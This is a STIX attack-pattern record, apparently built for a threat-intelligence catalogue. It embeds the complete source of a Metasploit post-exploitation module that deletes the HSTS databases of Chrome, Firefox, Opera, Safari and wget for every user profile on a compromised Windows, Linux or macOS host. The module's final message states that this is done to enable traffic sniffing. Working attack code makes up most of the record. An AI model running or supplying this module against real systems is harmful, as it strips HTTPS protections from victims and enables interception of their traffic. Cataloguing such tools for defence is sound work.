{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dca3f86f-9444-4c14-a2d1-026a1aa7ad00",
    "created": "2024-08-14T16:33:18.001413Z",
    "modified": "2024-08-14T16:33:18.001417Z",
    "name": "Web browsers HSTS entries eraser",
    "description": " This module removes the HSTS database of the following tools and web browsers: Mozilla Firefox Google Chrome, Opera, Safari and wget.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/hsts_eraser.rb",
            "external_id": "hsts_eraser.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.en.elevenpaths.com/2017/12/breaking-out-hsts-and-hpkp-on-firefox.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::OSX::System\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Web browsers HSTS entries eraser',\n        'Description' => %q{\n          This module removes the HSTS database of the following tools and web browsers: Mozilla Firefox,\n          Google Chrome, Opera, Safari and wget.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Sheila A. Berta (UnaPibaGeek)', # ElevenPaths\n        ],\n        'Platform' => %w[linux osx unix win],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'References' => [\n          [ 'URL', 'http://blog.en.elevenpaths.com/2017/12/breaking-out-hsts-and-hpkp-on-firefox.html' ],\n          [ 'URL', 'https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf' ]\n        ],\n        'SessionTypes' => %w[meterpreter shell]\n      )\n    )\n\n    register_options([\n      OptBool.new('DISCLAIMER',\n                  [true, 'This module will delete HSTS data from the target. Set this parameter to True in order to accept this warning.', false])\n    ])\n  end\n\n  def run\n    unless (datastore['DISCLAIMER'] == true)\n      print_error('This module will delete HSTS data from all browsers on the target. You must set the DISCLAIMER option to True to acknowledge that you understand this warning.')\n      return\n    end\n\n    profiles = user_profiles\n\n    profiles.each do |user_profile|\n      account = user_profile['UserName']\n      browsers_hsts_db_path = {}\n\n      case session.platform\n      when 'windows'\n        browsers_hsts_db_path = {\n          'Chrome' => \"#{user_profile['LocalAppData']}\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\TransportSecurity\",\n          'Firefox' => \"#{user_profile['AppData']}\\\\Mozilla\\\\Firefox\\\\Profiles\", # Just path for now\n          'Opera' => \"#{user_profile['AppData']}\\\\Opera Software\\\\Opera Stable\\\\TransportSecurity\"\n        }\n      when 'unix', 'linux'\n        browsers_hsts_db_path = {\n          'Chrome' => \"#{user_profile['LocalAppData']}/.config/google-chrome/Default/TransportSecurity\",\n          'Firefox' => \"#{user_profile['LocalAppData']}/.mozilla/firefox\", # Just path for now\n          'Opera' => \"#{user_profile['LocalAppData']}/.config/opera/TransportSecurity\",\n          'wget' => \"#{user_profile['LocalAppData']}/.wget-hsts\"\n        }\n      when 'osx'\n        browsers_hsts_db_path = {\n          'Chrome' => \"#{user_profile['LocalAppData']}/Google/Chrome/Default/TransportSecurity\",\n          'Firefox' => \"#{user_profile['LocalAppData']}/Firefox/Profiles\", # Just path for now\n          'Opera' => \"#{user_profile['LocalAppData']}/com.operasoftware.Opera/TransportSecurity\",\n          'Safari' => \"#{user_profile['AppData']}/Cookies/HSTS.plist\"\n        }\n      else\n        print_error \"Platform not recognized: #{session.platform}\"\n      end\n\n      browsers_hsts_db_path.each_pair do |browser, path|\n        if browser == 'Firefox'\n          hsts_db_path = []\n          if directory?(path)\n            files = dir(path)\n            files.reject! { |file| %w[. ..].include?(file) }\n            files.each do |file_path|\n              hsts_db_path.push([path, file_path, 'SiteSecurityServiceState.txt'].join(system_separator)) if file_path.match(/.*\\.default/)\n            end\n          end\n          path = hsts_db_path[0]\n        end\n        if !path.nil? && file?(path)\n          print_status \"Removing #{browser} HSTS database for #{account}... \"\n          file_rm(path)\n        end\n      end\n    end\n\n    print_status 'HSTS databases removed! Now enjoy your favorite sniffer! ;-)'\n  end\n\n  def user_profiles\n    user_profiles = []\n    case session.platform\n    when /unix|linux/\n      user_names = dir('/home')\n      user_names.reject! { |u| %w[. ..].include?(u) }\n      user_names.each do |user_name|\n        user_profiles.push('UserName' => user_name, 'LocalAppData' => \"/home/#{user_name}\")\n      end\n    when /osx/\n      user_names = session.shell_command('ls /Users').split\n      user_names.reject! { |u| u == 'Shared' }\n      user_names.each do |user_name|\n        user_profiles.push(\n          'UserName' => user_name,\n          'AppData' => \"/Users/#{user_name}/Library\",\n          'LocalAppData' => \"/Users/#{user_name}/Library/Application Support\"\n        )\n      end\n    when /windows/\n      user_profiles |= grab_user_profiles\n    else\n      print_error 'Error getting user profile data!'\n    end\n    user_profiles\n  end\n\n  def system_separator\n    return session.platform == 'windows' ? '\\\\' : '/'\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux osx unix win]"
    ]
}